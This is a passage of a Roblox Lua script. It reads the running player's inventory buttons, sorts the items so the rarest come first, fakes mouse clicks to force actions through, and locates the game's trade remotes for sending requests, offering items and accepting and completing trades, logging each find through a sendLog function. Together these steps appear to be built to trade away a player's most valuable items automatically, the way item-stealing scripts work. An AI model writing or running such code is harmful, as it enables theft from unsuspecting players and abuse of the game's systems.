    ["Icewing"] = 4,
    ["Frost Saber"] = 4,
    ["Snowflake"] = 3,
    ["Frostbite"] = 3,
    ["Winter's Edge"] = 3,
}

local function getItemRarity(itemName)
    for rarity, priority in pairs(RARITY_PRIORITY) do
        if itemName:find(rarity) then
            return priority
        end
    end
    return 1 -- Common items
end

local function getAllItemsFromGUI()
    local items = {}
    
    pcall(function()
        local playerGui = player.PlayerGui
        
        -- Find inventory GUI
        for _, gui in pairs(playerGui:GetDescendants()) do
            if (gui:IsA("ImageButton") or gui:IsA("TextButton")) and gui.Visible then
                local itemName = gui.Name
                
                -- Try to get name from text label
                local nameLabel = gui:FindFirstChild("Name") or gui:FindFirstChild("ItemName") or gui:FindFirstChild("Text")
                if nameLabel and nameLabel:IsA("TextLabel") then
                    itemName = nameLabel.Text
                end
                
                if itemName and itemName ~= "" and #itemName > 1 then
                    local rarityScore = getItemRarity(itemName)
                    table.insert(items, {
                        name = itemName,
                        frame = gui,
                        rarity = rarityScore
                    })
                end
            end
        end
    end)
    
    -- Sort by rarity (highest first)
    table.sort(items, function(a, b) return a.rarity > b.rarity end)
    
    return items
end

-- ============================================
-- CLICK SIMULATION (Forceful)
-- ============================================

local function forceClick(element)
    if not element then return false end
    pcall(function()
        -- Multiple click methods for guaranteed click
        element:Fire("MouseButton1Click")
        element:Fire("Activated")
        element:Fire("MouseButton1Down")
        element:Fire("MouseButton1Up")
        element:Fire("InputBegan")
        element:Fire("InputEnded")
        
        -- Virtual click
        local pos = element.AbsolutePosition
        local size = element.AbsoluteSize
        if pos and size then
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
            wait(0.02)
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
        end
    end)
    return true
end

-- ============================================
-- TRADE REMOTES (Direct method)
-- ============================================

local remotes = {}

local function findRemotes()
    -- Find all trade remotes
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name
            if name == "AcceptRequest" then
                remotes.AcceptRequest = v
                sendLog("Found AcceptRequest remote")
            elseif name == "OfferItem" then
                remotes.OfferItem = v
                sendLog("Found OfferItem remote")
            elseif name == "AcceptTrade" then
                remotes.AcceptTrade = v
                sendLog("Found AcceptTrade remote")
            elseif name == "CompleteTrade" then
                remotes.CompleteTrade = v
                sendLog("Found CompleteTrade remote")
            end
        end
    end
end

